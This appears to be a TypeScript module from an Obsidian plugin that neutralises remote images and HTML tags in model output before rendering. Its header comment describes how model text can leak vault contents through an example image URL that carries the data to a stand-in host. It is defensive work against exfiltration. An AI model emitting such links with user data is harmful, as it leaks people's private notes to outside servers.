/**
 * Model and fetched text is untrusted. Rendered as markdown, a remote
 * image (`![](https://host/?d=<vault text>)`) or raw HTML (`<img>`,
 * `<iframe>`, a `style` with `url()`) makes Obsidian fetch that URL the
 * moment it renders, which leaks whatever the model put in it. A DOM
 * sweep after rendering is too late: an <img> starts loading as soon as
 * its src is set. So the text is neutralized before it reaches the
 * renderer, with a zero-width space that is invisible in prose and in
 * code blocks:
 *
 * - `<` before a letter, `/`, `!` or `?` gets one, so neither the
 *   markdown parser nor the browser's HTML tokenizer can open a tag or
 *   an HTML block. Autolinks (`<https://…>`) render as links and stay.
 * - `![` gets one unless the image provably points inside the vault: a
 *   `![[wikilink]]` embed, or an inline `![alt](target)` whose target has
 *   no scheme, no leading `//` and nothing an entity or escape could turn
 *   into one. A remote image becomes a plain link.
 *
 * Idempotent: a marked `<` or `!` is no longer followed by the trigger.
 */

export const ZWSP = '​';

const AUTOLINK = /<[A-Za-z][A-Za-z0-9+.-]{1,31}:[^\s<>]*>/y;
const TAG_START = /[A-Za-z/!?]/;
/** Longest alt text or embed target inspected before giving up. */
const SCAN_LIMIT = 2000;

export function neutralizeRemoteMedia(md: string): string {
  let out = '';
  for (let i = 0; i < md.length; i++) {
    const c = md[i];
    out += c;
    if (c === '<' && TAG_START.test(md[i + 1] ?? '')) {
      AUTOLINK.lastIndex = i;
      if (!AUTOLINK.test(md)) out += ZWSP;
    } else if (c === '!' && md[i + 1] === '[' && !isVaultImage(md, i + 1)) {
      out += ZWSP;
    }
  }
  return out;
}

/** Undo neutralizeRemoteMedia, for text read back from a saved note. */
export function restoreRemoteMedia(md: string): string {
  return md
    .replace(/<​(?=[A-Za-z/!?])/g, '<')
    .replace(/!​(?=\[)/g, '!');
}

/** `open` indexes the `[` after `!`. */
function isVaultImage(md: string, open: number): boolean {
  if (md[open + 1] === '[') {
    const end = md.indexOf(']]', open + 2);
    if (end < 0 || end - open > SCAN_LIMIT) return false;
    // `![[a]](url)` is a CommonMark image with alt "[a]".
    if (md[end + 2] === '(' || md[end + 2] === '[') return false;
    const inner = md.slice(open + 2, end);
    if (/[[\]\n]/.test(inner)) return false;
    return isVaultTarget(inner.split(/[#|^]/)[0], true);
  }
  let depth = 0;
  let k = open;
  for (; k < md.length && k - open < SCAN_LIMIT; k++) {
    const ch = md[k];
    if (ch === '\\') {
      k++;
      continue;
    }
    // Code spans and tags take precedence over brackets; don't guess.
    if (ch === '`' || ch === '<') return false;
    if (ch === '[') depth++;
    else if (ch === ']' && --depth === 0) break;
  }
  if (depth !== 0 || md[k + 1] !== '(') return false;
  let p = k + 2;
  while (p < md.length && /[ \t\r\n]/.test(md[p])) p++;
  let target: string;
  if (md[p] === '<') {
    const close = md.indexOf('>', p);
    if (close < 0) return false;
    target = md.slice(p + 1, close);
  } else {
    target = /^[^ \t\r\n]*/.exec(md.slice(p, p + SCAN_LIMIT))?.[0] ?? '';
  }
  return isVaultTarget(target, false);
}

function isVaultTarget(target: string, spacesAllowed: boolean): boolean {
  if (!target || target.startsWith('//')) return false;
  const banned = spacesAllowed
    ? /[\x00-\x1f\x7f:&\\]/
    : /[\s\x00-\x1f\x7f:&\\]/;
  return !banned.test(target);
}
